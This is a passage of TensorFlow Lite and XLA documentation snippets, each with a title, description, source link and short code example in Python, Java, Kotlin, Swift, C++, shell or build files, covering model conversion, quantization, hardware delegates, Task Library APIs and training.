    Model.Options options;
    CompatibilityList compatList = new CompatibilityList();

    if(compatList.isDelegateSupportedOnThisDevice()){
        // if the device has a supported GPU, add the GPU delegate
        options = Model.Options.Builder().setDevice(Model.Device.GPU).build();
    } else {
        // if the GPU is not supported, run on 4 threads
        options = Model.Options.Builder().setNumThreads(4).build();
    }

    MyModel myModel = MyModel.newInstance(context, options);

    // Run inference per sample code
```

----------------------------------------

TITLE: Initializing Task API (TfLiteVision) with GPU Support (Java)
DESCRIPTION: Initialize the TFLite Task API, using `TfLiteVision` as an example, by setting the `setEnableGpuDelegateSupport` option to true in the initialization builder.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/android/java.md#_snippet_20

LANGUAGE: Java
CODE:
```
TfLiteVision.initialize(context, TfLiteInitializationOptions.builder().setEnableGpuDelegateSupport(true).build());
```

----------------------------------------

TITLE: Converting Model with Select TF Ops - Python
DESCRIPTION: This snippet demonstrates how to use the TensorFlow Lite Converter in Python to convert a SavedModel into a TFLite model, explicitly enabling both built-in TFLite operators and select TensorFlow operators.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/guide/ops_select.md#_snippet_0

LANGUAGE: python
CODE:
```
import tensorflow as tf

converter = tf.lite.TFLiteConverter.from_saved_model(saved_model_dir)
converter.target_spec.supported_ops = [
  tf.lite.OpsSet.TFLITE_BUILTINS, # enable TensorFlow Lite ops.
  tf.lite.OpsSet.SELECT_TF_OPS # enable TensorFlow ops.
]
tflite_model = converter.convert()
open("converted_model.tflite", "wb").write(tflite_model)
```

----------------------------------------

TITLE: Enabling XNNPACK via Swift API on iOS
DESCRIPTION: This snippet shows how to enable the XNNPACK delegate when using the TensorFlow Lite Swift API on iOS. You set the `isXNNPackEnabled` property to `true` on an `InterpreterOptions` object before initializing the interpreter.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/delegates/xnnpack/README.md#_snippet_1

LANGUAGE: Swift
CODE:
```
var options = InterpreterOptions()
options.isXNNPackEnabled = true
var interpreter = try Interpreter(modelPath: "model/path", options: options)
```

----------------------------------------

TITLE: Loading ResNet-v2-101 from TF Hub Python
DESCRIPTION: Imports the tensorflow_hub library. It defines a Keras Sequential model with an input layer and a hub.KerasLayer to load a pre-trained ResNet-v2-101 classification model from TensorFlow Hub. A TensorFlow Lite converter is then initialized using this Keras model.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/performance/post_training_quant.ipynb#_snippet_15

LANGUAGE: python
CODE:
```
import tensorflow_hub as hub

resnet_v2_101 = tf.keras.Sequential([
  keras.layers.InputLayer(input_shape=(224, 224, 3)),
  hub.KerasLayer("https://tfhub.dev/google/imagenet/resnet_v2_101/classification/4")
])

converter = tf.lite.TFLiteConverter.from_keras_model(resnet_v2_101)
```

----------------------------------------

TITLE: Converting JAX Model to Quantized TFLite (Python)
DESCRIPTION: Defines model input shape, converts a JAX Keras ResNet50 model to a TensorFlow callable function using `jax2tf`, wraps it in a `tf.Module`, and saves it as a SavedModel. It then defines a representative dataset for quantization, configures a TFLiteConverter to use the StableHLO quantizer, performs the conversion, and saves the resulting quantized TFLite model. Dependencies include `jax`, `jax2tf`, `keras_core`, `tensorflow`.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/compiler/mlir/quantization/stablehlo/python/integration_test/stablehlo_quantizer_odml_oss.ipynb#_snippet_4

LANGUAGE: python
CODE:
```
input_shape = (1, 224, 224, 3)

jax_callable = jax2tf.convert(
    ResNet50(
      input_shape=input_shape[1:],
      pooling='avg',
  ).call,
    with_gradient=False,
    native_serialization=True,
    native_serialization_platforms=('cpu',))

tf_module = tf.Module()
tf_module.f = tf.function(
    jax_callable,
    autograph=False,
    input_signature=[
        tf.TensorSpec(input_shape, jnp.float32, 'lhs_operand')
    ],
)

saved_model_dir = '/tmp/saved_model'
tf.saved_model.save(tf_module, saved_model_dir)

def calibration_dataset():
  rng = np.random.default_rng(seed=1235)
  for _ in range(2):
    yield {
        'lhs_operand': rng.uniform(low=-1.0, high=1.0, size=input_shape).astype(
            np.float32
        )
    }
converter = tf.lite.TFLiteConverter.from_saved_model(saved_model_dir)
converter.target_spec.supported_ops = [
    tf.lite.OpsSet.SELECT_TF_OPS,  # enable TensorFlow ops.
    tf.lite.OpsSet.TFLITE_BUILTINS,  # enable TFL ops.
]
converter.representative_dataset = calibration_dataset
converter.optimizations = [tf.lite.Optimize.DEFAULT]
# Below flag controls whether to use StableHLO Quantizer or TFLite quantizer.
converter.experimental_use_stablehlo_quantizer = True

quantized_model = converter.convert()

with open('/tmp/resnet50_quantized.tflite', 'wb') as f:
  f.write(quantized_model)
```

----------------------------------------

TITLE: Adding TensorFlow Lite Task Libraries Dependencies (Gradle)
DESCRIPTION: This snippet shows the necessary Gradle dependencies to include the TensorFlow Lite Task Vision, Task Text, and Task Audio libraries in an Android project's `build.gradle` file. These AARs are hosted on MavenCentral and provide task-specific model interfaces.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/android/development.md#_snippet_0

LANGUAGE: Gradle
CODE:
```
dependencies {
    implementation 'org.tensorflow:tensorflow-lite-task-vision:+'
    implementation 'org.tensorflow:tensorflow-lite-task-text:+'
    implementation 'org.tensorflow:tensorflow-lite-task-audio:+'
}
```

----------------------------------------

TITLE: Populating Metadata into Model (TensorFlow Lite, Python)
DESCRIPTION: This function executes the process of embedding the configured metadata and associated files (like label files) into the TensorFlow Lite model file. It returns a new bytearray containing the updated model buffer with the metadata successfully added. This is the core operation of the MetadataWriter.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/metadata_writers/bert_nl_classifier/MetadataWriter.md#_snippet_6

LANGUAGE: python
CODE:
```
populate() -> bytearray

```

----------------------------------------

TITLE: Initializing DetectionOptions Python
DESCRIPTION: Initializes a `DetectionOptions` object with various parameters to configure the object detection processor. Parameters allow filtering results based on score, category names, locale for display names, and limiting the number of results.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/task/processor/DetectionOptions.md#_snippet_0

LANGUAGE: python
CODE:
```
tflite_support.task.processor.DetectionOptions(
    score_threshold: Optional[float] = None,
    category_name_allowlist: Optional[List[str]] = None,
    category_name_denylist: Optional[List[str]] = None,
    display_names_locale: Optional[str] = None,
    max_results: Optional[int] = None
)
```

----------------------------------------

TITLE: Importing TFLite Module in Objective-C
DESCRIPTION: Imports the TensorFlowLite module using the `@import` syntax, making the Objective-C TFLite APIs available for use. This is the standard way to include the module in Objective-C projects configured via Cocoapods.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/guide/inference.md#_snippet_10

LANGUAGE: Objective-C
CODE:
```
@import TensorFlowLite;
```

----------------------------------------

TITLE: Initializing and Running Image Classification in C++
DESCRIPTION: Shows the steps to initialize the ImageClassifier in C++. It involves setting the model file name in options, creating the classifier, preparing an input FrameBuffer from image data and dimensions, and running the Classify method.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/inference_with_metadata/task_library/image_classifier.md#_snippet_7

LANGUAGE: C++
CODE:
```
// Initialization
ImageClassifierOptions options;
options.mutable_base_options()->mutable_model_file()->set_file_name(model_path);
std::unique_ptr<ImageClassifier> image_classifier = ImageClassifier::CreateFromOptions(options).value();

// Create input frame_buffer from your inputs, `image_data` and `image_dimension`.
// See more information here: tensorflow_lite_support/cc/task/vision/utils/frame_buffer_common_utils.h

std::unique_ptr<FrameBuffer> frame_buffer = CreateFromRgbRawBuffer(
      image_data, image_dimension);

// Run inference
const ClassificationResult result = image_classifier->Classify(*frame_buffer).value();
```

----------------------------------------

TITLE: Setting TFLite Demo Configuration Parameters in Python
DESCRIPTION: Defines configuration variables for initializing and running the TFLite text classification model using the TFLite Task Library. Parameters include the model file path, whether to use an EdgeTPU, and the number of CPU threads.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/models/modify/model_maker/text_classification.ipynb#_snippet_11

LANGUAGE: python
CODE:
```
# Name of the TFLite text classification model.
_MODEL = '/content/average_word_vec/model.tflite'
# Whether to run the model on EdgeTPU.
_ENABLE_EDGETPU = False
# Number of CPU threads to run the model.
_NUM_THREADS = 4
```

----------------------------------------

TITLE: Training the Image Classifier Model - Python TensorFlow
DESCRIPTION: Initiates the training process for the image classifier model using the provided training data and optional validation data. Accepts hyperparameters and allows specifying the number of steps per epoch.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_model_maker/image_classifier/ImageClassifier.md#_snippet_9

LANGUAGE: Python
CODE:
```
train(
    train_data, validation_data=None, hparams=None, steps_per_epoch=None
)
```

----------------------------------------

TITLE: Create TensorFlow Lite Image Embedder from File Python
DESCRIPTION: Creates an `ImageEmbedder` instance from a TensorFlow Lite model file. Requires the path to the model file as a string. Returns the initialized `ImageEmbedder` object or raises an exception on failure (ValueError for invalid file, RuntimeError for other errors).
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/task/vision/ImageEmbedder.md#_snippet_1

LANGUAGE: python
CODE:
```
@classmethod
create_from_file(
    file_path: str
) -> 'ImageEmbedder'
```

----------------------------------------

TITLE: Applying Dynamic Range Quantization (Python)
DESCRIPTION: This snippet demonstrates the basic dynamic range quantization process. It initializes the TFLiteConverter from a saved model directory and sets the `optimizations` property to `tf.lite.Optimize.DEFAULT`. This default setting includes dynamic range quantization for weights. The converted, quantized model is stored in `tflite_quant_model`.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/performance/post_training_quantization.md#_snippet_0

LANGUAGE: Python
CODE:
```
import tensorflow as tf
converter = tf.lite.TFLiteConverter.from_saved_model(saved_model_dir)
converter.optimizations = [tf.lite.Optimize.DEFAULT]
tflite_quant_model = converter.convert()
```

----------------------------------------

TITLE: Initializing EfficientNet-Lite0Spec Python
DESCRIPTION: Initializes an `EfficientNetLite0Spec` object, defining the configuration for an EfficientNet-Lite0 model to be used with TFLite Model Maker. This constructor takes optional parameters to specify the pretrained model URI, compatible TensorFlow versions, the expected input image shape, and a descriptive name for the model specification.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_model_maker/image_classifier/EfficientNetLite0Spec.md#_snippet_0

LANGUAGE: Python
CODE:
```
tflite_model_maker.image_classifier.EfficientNetLite0Spec(
    *,
    uri='https://tfhub.dev/tensorflow/efficientnet/lite0/feature-vector/2',
    compat_tf_versions=[1, 2],
    input_image_shape=None,
    name='efficientnet_lite0'
)
```

----------------------------------------

TITLE: Install EdgeTPU Compiler - Python (Shell)
DESCRIPTION: This snippet executes shell commands within a Python environment (like Colab or Jupyter) to add the Google Cloud APT key and repository, update the package list, and install the Edge TPU compiler package.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/models/modify/model_maker/object_detection.ipynb#_snippet_12

LANGUAGE: python
CODE:
```
! curl https://packages.cloud.google.com/apt/doc/apt-key.gpg | sudo apt-key add -

! echo "deb https://packages.cloud.google.com/apt coral-edgetpu-stable main" | sudo tee /etc/apt/sources.list.d/coral-edgetpu.list

! sudo apt-get update

! sudo apt-get install edgetpu-compiler
```

----------------------------------------

TITLE: Dequantizing Output Tensors using TensorProcessor in TFLite Java
DESCRIPTION: Explains how to create a TensorProcessor with a DequantizeOp to convert a quantized output TensorBuffer (like the probabilityBuffer from the previous step) into a floating-point TensorBuffer. The DequantizeOp maps the UINT8 values to a float range (0 to 1 in this example), typically used for post-processing model output.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/inference_with_metadata/lite_support.md#_snippet_9

LANGUAGE: java
CODE:
```
import org.tensorflow.lite.support.common.TensorProcessor;
import org.tensorflow.lite.support.common.ops.DequantizeOp;

// Post-processor which dequantize the result
TensorProcessor probabilityProcessor =
    new TensorProcessor.Builder().add(new DequantizeOp(0, 1/255.0)).build();
TensorBuffer dequantizedBuffer = probabilityProcessor.process(probabilityBuffer);
```

----------------------------------------

TITLE: Initializing TFLite Audio Embedder Options - Python
DESCRIPTION: This snippet shows the constructor signature for the `AudioEmbedderOptions` class. It requires `base_options` (of type `tflite_support.task.core.BaseOptions`) for general task configuration and optionally accepts `embedding_options` (of type `tflite_support.task.processor.EmbeddingOptions`) which defaults to a factory-created instance. This class defines the configuration for the TFLite audio embedding task.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/task/audio/AudioEmbedderOptions.md#_snippet_0

LANGUAGE: python
CODE:
```
tflite_support.task.audio.AudioEmbedderOptions(
    base_options: tflite_support.task.core.BaseOptions,
    embedding_options: tflite_support.task.processor.EmbeddingOptions = dataclasses.field(default_factory=_EmbeddingOptions)
)
```

----------------------------------------

TITLE: Perform Segmentation with ImageSegmenter - Python
DESCRIPTION: Performs the image segmentation task on a provided `TensorImage` input. This is the core method for applying the loaded TFLite model to an image. It returns a `SegmentationResult` object containing the segmentation masks and other relevant information, or raises `ValueError`/`RuntimeError` if the segmentation fails.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/task/vision/ImageSegmenter.md#_snippet_3

LANGUAGE: python
CODE:
```
segment(
    image: tflite_support.task.vision.TensorImage
) -> tflite_support.task.processor.SegmentationResult
```

----------------------------------------

TITLE: Creating Output TensorBuffer for TFLite Results Java
DESCRIPTION: This Java snippet demonstrates how to create a `TensorBuffer` object to serve as the container for the TensorFlow Lite model's output results. It specifies the expected shape (dimensions) of the output tensor and its data type, which is `DataType.UINT8` in this example, suitable for quantized models.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/inference_with_metadata/lite_support.md#_snippet_3

LANGUAGE: Java
CODE:
```
import org.tensorflow.lite.DataType;
import org.tensorflow.lite.support.tensorbuffer.TensorBuffer;

// Create a container for the result and specify that this is a quantized model.
// Hence, the 'DataType' is defined as UINT8 (8-bit unsigned integer)
TensorBuffer probabilityBuffer =
    TensorBuffer.createFixedSize(new int[]{1, 1001}, DataType.UINT8);
```

----------------------------------------

TITLE: Normalizing Image Pixel Values (Python)
DESCRIPTION: Divides the pixel values of the loaded training and testing images by 255.0 to scale them to the range [0, 1]. This is a common preprocessing step required by many neural network models. The arrays are also cast to `float32` data type.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/examples/on_device_training/overview.ipynb#_snippet_3

LANGUAGE: python
CODE:
```
train_images = (train_images / 255.0).astype(np.float32)
test_images = (test_images / 255.0).astype(np.float32)
```

----------------------------------------

TITLE: Closing TFLite Interpreter and Releasing Resources Java
DESCRIPTION: Releases all native resources associated with the TensorFlow Lite interpreter instance. This method must be called when the interpreter is no longer needed to prevent memory leaks. Using a try-with-resources block is the preferred Java approach.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/guide/inference.md#_snippet_7

LANGUAGE: Java
CODE:
```
interpreter.close();
```

----------------------------------------

TITLE: Enabling XNNPACK via Java API on Android
DESCRIPTION: This snippet demonstrates how to enable the XNNPACK delegate using the Java API for TensorFlow Lite on Android. It involves creating an `Interpreter.Options` object and calling the `setUseXNNPACK` method with `true`.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/delegates/xnnpack/README.md#_snippet_0

LANGUAGE: Java
CODE:
```
Interpreter.Options interpreterOptions = new Interpreter.Options();
interpreterOptions.setUseXNNPACK(true);
Interpreter interpreter = new Interpreter(model, interpreterOptions);
```

----------------------------------------

TITLE: Run Inference - TFLite Interpreter API Kotlin
DESCRIPTION: This Kotlin snippet shows the core method call to execute a TensorFlow Lite model using the Interpreter API. It takes input data in `inputBuffer` and places the results in `outputBuffer`.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/android/java.md#_snippet_11

LANGUAGE: Kotlin
CODE:
```
interpreter.run(inputBuffer, outputBuffer)
```

----------------------------------------

TITLE: Build TFLite Benchmark Tool (CMake)
DESCRIPTION: Builds the TensorFlow Lite benchmark model executable using the CMake build system. The `-t benchmark_model` option specifically targets this utility, which is used for evaluating performance.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/guide/build_cmake.md#_snippet_18

LANGUAGE: sh
CODE:
```
cmake --build . -j -t benchmark_model
```

----------------------------------------

TITLE: Creating MetadataWriter for Inference (Python)
DESCRIPTION: This class method initializes a MetadataWriter with the essential metadata required for TFLite Support features like Task Library and Codegen. It necessitates the model buffer, input normalization parameters (mean and standard deviation), and paths to label files. Optional score calibration information can also be provided. Other metadata fields will use default values.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/metadata_writers/image_classifier/MetadataWriter.md#_snippet_1

LANGUAGE: python
CODE:
```
@classmethod
create_for_inference(
    model_buffer: bytearray,
    input_norm_mean: List[float],
    input_norm_std: List[float],
    label_file_paths: List[str],
    score_calibration_md: Optional[<a href="../../../tflite_support/metadata_writers/metadata_info/ScoreCalibrationMd"><code>tflite_support.metadata_writers.metadata_info.ScoreCalibrationMd</code></a>] = None
)
```

----------------------------------------

TITLE: Plotting Prediction Results Python
DESCRIPTION: Visualizes the predicted labels for the first 100 images in the test dataset. It plots each image with its predicted label, highlighting incorrect predictions in red and correct ones in black. This helps in visually assessing the model's performance.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/models/modify/model_maker/image_classification.ipynb#_snippet_13

LANGUAGE: python
CODE:
```
# A helper function that returns 'red'/'black' depending on if its two input
# parameter matches or not.
def get_label_color(val1, val2):
  if val1 == val2:
    return 'black'
  else:
    return 'red'

# Then plot 100 test images and their predicted labels.
# If a prediction result is different from the label provided label in "test"
# dataset, we will highlight it in red color.
plt.figure(figsize=(20, 20))
predicts = model.predict_top_k(test_data)
for i, (image, label) in enumerate(test_data.gen_dataset().unbatch().take(100)):
  ax = plt.subplot(10, 10, i+1)
  plt.xticks([])
  plt.yticks([])
  plt.grid(False)
  plt.imshow(image.numpy(), cmap=plt.cm.gray)

  predict_label = predicts[i][0][0]
  color = get_label_color(predict_label,
                          test_data.index_to_label[label.numpy()])
  ax.xaxis.label.set_color(color)
  plt.xlabel('Predicted: %s' % predict_label)
plt.show()
```

----------------------------------------

TITLE: Profiling Float Operations (FLOPs) in TensorFlow (Python)
DESCRIPTION: Shows how to use `tf.profiler.profile` with `ProfileOptionBuilder.float_operation()` to analyze the number of floating-point operations performed by the TensorFlow model, broken down by individual operations.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/core/profiler/g3doc/python_api.md#_snippet_2

LANGUAGE: python
CODE:
```
# Print to stdout an analysis of the number of floating point operations in the
# model broken down by individual operations.
tf.profiler.profile(
    tf.get_default_graph(),
    options=tf.profiler.ProfileOptionBuilder.float_operation())
```

----------------------------------------

TITLE: Performing Image Classification TFLite Python
DESCRIPTION: Performs image classification on the provided `TensorImage`. An optional `bounding_box` can be specified to classify only a region of interest. It returns a `ClassificationResult` object or raises `ValueError`/`RuntimeError` on failure.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/task/vision/ImageClassifier.md#_snippet_1

LANGUAGE: python
CODE:
```
classify(
    image: <a href="../../../tflite_support/task/vision/TensorImage"><code>tflite_support.task.vision.TensorImage</code></a>,
    bounding_box: Optional[<a href="../../../tflite_support/task/processor/BoundingBox"><code>tflite_support.task.processor.BoundingBox</code></a>] = None
) -> <a href="../../../tflite_support/task/processor/ClassificationResult"><code>tflite_support.task.processor.ClassificationResult</code></a>
```

----------------------------------------

TITLE: Defining and Generating CNN Model Python
DESCRIPTION: Defines a Python function `generate_model` that constructs a Keras Sequential model suitable for image classification, specifically CIFAR-10. The model architecture includes convolutional layers, activation functions, max pooling, dropout for regularization, flattening, and dense layers, ending with a softmax output layer for 10 classes. The function is then called to instantiate the model.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/third_party/xla/docs/tf2xla/tutorials/autoclustering_xla.ipynb#_snippet_3

LANGUAGE: python
CODE:
```
def generate_model():
  return tf.keras.models.Sequential([
    tf.keras.layers.Conv2D(32, (3, 3), padding='same', input_shape=x_train.shape[1:]),
    tf.keras.layers.Activation('relu'),
    tf.keras.layers.Conv2D(32, (3, 3)),
    tf.keras.layers.Activation('relu'),
    tf.keras.layers.MaxPooling2D(pool_size=(2, 2)),
    tf.keras.layers.Dropout(0.25),

    tf.keras.layers.Conv2D(64, (3, 3), padding='same'),
    tf.keras.layers.Activation('relu'),
    tf.keras.layers.Conv2D(64, (3, 3)),
    tf.keras.layers.Activation('relu'),
    tf.keras.layers.MaxPooling2D(pool_size=(2, 2)),
    tf.keras.layers.Dropout(0.25),

    tf.keras.layers.Flatten(),
    tf.keras.layers.Dense(512),
    tf.keras.layers.Activation('relu'),
    tf.keras.layers.Dropout(0.5),
    tf.keras.layers.Dense(10),
    tf.keras.layers.Activation('softmax')
  ])

model = generate_model()
```

----------------------------------------

TITLE: Evaluating Model Accuracy on Test Data Python
DESCRIPTION: After training, this snippet evaluates the model's performance on the test dataset. It casts the test data, performs a forward pass through the trained `layer` to get predictions, compares the predicted class (argmax) with the true labels, and calculates the mean accuracy. The final accuracy percentage is then printed.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/third_party/xla/docs/tf2xla/tutorials/jit_compile.ipynb#_snippet_6

LANGUAGE: python
CODE:
```
images, labels = cast(test[0], test[1])
predicted_labels = layer(images)
correct_prediction = tf.equal(tf.argmax(predicted_labels, 1), labels)
accuracy = tf.reduce_mean(tf.cast(correct_prediction, tf.float32))
print("Prediction accuracy after training: %s" % accuracy)
```

----------------------------------------

TITLE: Defining Float16 Quantization Config - Python
DESCRIPTION: Creates a QuantizationConfig object specifically configured for float16 post-training quantization. This configuration can then be applied when exporting the model to reduce its size and potentially improve inference speed on compatible hardware. Requires importing QuantizationConfig.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/models/modify/model_maker/image_classification.ipynb#_snippet_17

LANGUAGE: python
CODE:
```
config = QuantizationConfig.for_float16()
```

----------------------------------------

TITLE: Load Custom Dataset with DataLoader in Python
DESCRIPTION: This snippet loads a custom audio dataset from the specified directory using TensorFlow Lite Model Maker's DataLoader. It splits the loaded data into training and validation sets based on a specified ratio, enabling caching for performance.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/models/modify/model_maker/speech_recognition.ipynb#_snippet_12

LANGUAGE: python
CODE:
```
if use_custom_dataset:
  train_data_ratio = 0.8
  train_data = audio_classifier.DataLoader.from_folder(
      spec, dataset_dir, cache=True)
  train_data, validation_data = train_data.split(train_data_ratio)
  test_data = audio_classifier.DataLoader.from_folder(
      spec, test_dir, cache=True)

```

----------------------------------------

TITLE: Saving Default Float TFLite Model to File Python
DESCRIPTION: Defines the file path for the default float32 TensorFlow Lite model within the previously created directory. It then writes the converted `tflite_model` byte content to this file path.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/performance/post_training_integer_quant_16x8.ipynb#_snippet_5

LANGUAGE: python
CODE:
```
tflite_model_file = tflite_models_dir/"mnist_model.tflite"
tflite_model_file.write_bytes(tflite_model)
```

----------------------------------------

TITLE: Training Model (Python)
DESCRIPTION: Feeds the provided training data to the model to initiate the training process. Optionally accepts validation data for monitoring performance during training. Parameters for epochs, batch size, and steps per epoch can be provided to control the training loop.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_model_maker/text_classifier/TextClassifier.md#_snippet_9

LANGUAGE: python
CODE:
```
train(
    train_data,
    validation_data=None,
    epochs=None,
    batch_size=None,
    steps_per_epoch=None
)
```

----------------------------------------

TITLE: Instantiating TFLite Micro Interpreter (C++)
DESCRIPTION: Creates an instance of the `tflite::MicroInterpreter`, which is the central class for running inference. It is initialized with the loaded model, the operation resolver, the tensor arena and its size, and the error reporter. This object manages the model execution lifecycle.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/microcontrollers/get_started_low_level.md#_snippet_9

LANGUAGE: C++
CODE:
```
tflite::MicroInterpreter interpreter(model, resolver, tensor_arena,
                                     tensor_arena_size, error_reporter);
```

----------------------------------------

TITLE: Mixing Python Loop and TF Conditional Break (Python)
DESCRIPTION: This example demonstrates a common cause for `OperatorNotAllowedInGraphError`. It uses a Python `for` loop and a TensorFlow conditional (`if i > tf.constant(0)`). Attempting to use a Python control flow statement like `break` based on a TensorFlow Tensor value within a graph context raises this error because Python `bool` casting of Tensors is disallowed in graphs.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/python/autograph/g3doc/reference/common_errors.md#_snippet_2

LANGUAGE: Python
CODE:
```
for i in range(3):  # Python loop
  if i > tf.constant(0):  # TF conditional
    break  # raises OperatorNotAllowedInGraphError
```

----------------------------------------

TITLE: Converting GraphDef Allowing Select TensorFlow Operators in TFLite
DESCRIPTION: This command converts a GraphDef while enabling the usage of specific TensorFlow operators not natively built into TensorFlow Lite. The `--target_ops=TFLITE_BUILTINS,SELECT_TF_OPS` flag instructs the converter to include built-in TFLite ops and a selection of allowed TensorFlow ops.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/r1/convert/cmdline_examples.md#_snippet_6

LANGUAGE: Shell
CODE:
```
tflite_convert \
  --graph_def_file=/tmp/foo.pb \
  --output_file=/tmp/foo.tflite \
  --input_arrays=input \
  --output_arrays=MobilenetV1/Predictions/Reshape_1 \
  --target_ops=TFLITE_BUILTINS,SELECT_TF_OPS
```

----------------------------------------

TITLE: Profiling Time and Memory Usage in TensorFlow (Python)
DESCRIPTION: Illustrates how to use `tf.profiler.profile` with collected `RunMetadata` to analyze memory usage and timing information. Examples show analysis broken down by Python code segments and by operation types.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/core/profiler/g3doc/python_api.md#_snippet_4

LANGUAGE: python
CODE:
```
# Print to stdout an analysis of the memory usage and the timing information
# broken down by python codes.
ProfileOptionBuilder = tf.profiler.ProfileOptionBuilder
opts = ProfileOptionBuilder(ProfileOptionBuilder.time_and_memory()
    ).with_node_names(show_name_regexes=['.*my_code.py.*']).build()

tf.profiler.profile(
    tf.get_default_graph(),
    run_meta=run_metadata,
    cmd='code',
    options=opts)

# Print to stdout an analysis of the memory usage and the timing information
# broken down by operation types.
tf.profiler.profile(
    tf.get_default_graph(),
    run_meta=run_metadata,
    cmd='op',
    options=tf.profiler.ProfileOptionBuilder.time_and_memory())
```

----------------------------------------

TITLE: Adding TensorFlow Lite Task Vision Pod in iOS (CocoaPods)
DESCRIPTION: This CocoaPods snippet shows the entry needed in a Podfile to include the `TensorFlowLiteTaskVision` library in an iOS project, which provides the ImageSegmenter API for Swift and Objective-C.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/inference_with_metadata/task_library/image_segmenter.md#_snippet_2

LANGUAGE: Ruby
CODE:
```
target 'MyAppWithTaskAPI' do
  use_frameworks!
  pod 'TensorFlowLiteTaskVision'
end
```

----------------------------------------

TITLE: Evaluate Quantized TFLite Model Accuracy Python
DESCRIPTION: Evaluates the accuracy of the generated quantized TFLite model using the `eval_tflite` helper function and the representative dataset. It prints the Top-5 accuracy to show the impact of quantization and the potential accuracy loss.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/performance/quantization_debugger.ipynb#_snippet_5

LANGUAGE: Python
CODE:
```
eval_tflite(quantized_model, ds)
```

----------------------------------------

TITLE: Defining Distributed Strategy Step Function with XLA Python
DESCRIPTION: Illustrates how to apply `@tf.function(jit_compile=True)` to a step function intended for use within TensorFlow distributed strategies like `MirroredStrategy`. This enables XLA compilation for the computation performed on each replica.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/third_party/xla/docs/tf2xla/index.md#_snippet_5

LANGUAGE: Python
CODE:
```
@tf.function(jit_compile=True)
def step_fn():
  t = tf.ones(shape=[100], dtype=tf.float32)
  ctx = tf.distribute.get_replica_context()
  return ctx.all_reduce(tf.distribute.ReduceOp.SUM, t)
```

----------------------------------------

TITLE: Configuring Base Options and Hardware Acceleration Delegate - Kotlin
DESCRIPTION: Initializes the `BaseOptions.builder` for the classifier, typically setting the number of threads. It then uses a 'when' statement to conditionally apply a TensorFlow Lite delegate, such as NNAPI (`baseOptionsBuilder.useNnapi()`), based on the `currentDelegate` setting to potentially leverage hardware acceleration for inference.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/android/tutorials/audio_classification.md#_snippet_6

LANGUAGE: Kotlin
CODE:
```
val baseOptionsBuilder = BaseOptions.builder()
   .setNumThreads(numThreads)
...
when (currentDelegate) {
   DELEGATE_CPU -> {
       // Default
   }
   DELEGATE_NNAPI -> {
       baseOptionsBuilder.useNnapi()
   }
}
```

----------------------------------------

TITLE: Adding CocoaPods Dependency for Swift BertNLClassifier
DESCRIPTION: This snippet illustrates how to add the TensorFlow Lite Task Text library dependency to a Swift project using CocoaPods. Edit your Podfile to include the specified pod, then run `pod install` to integrate the library.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/inference_with_metadata/task_library/bert_nl_classifier.md#_snippet_2

LANGUAGE: ruby
CODE:
```
target 'MySwiftAppWithTaskAPI' do
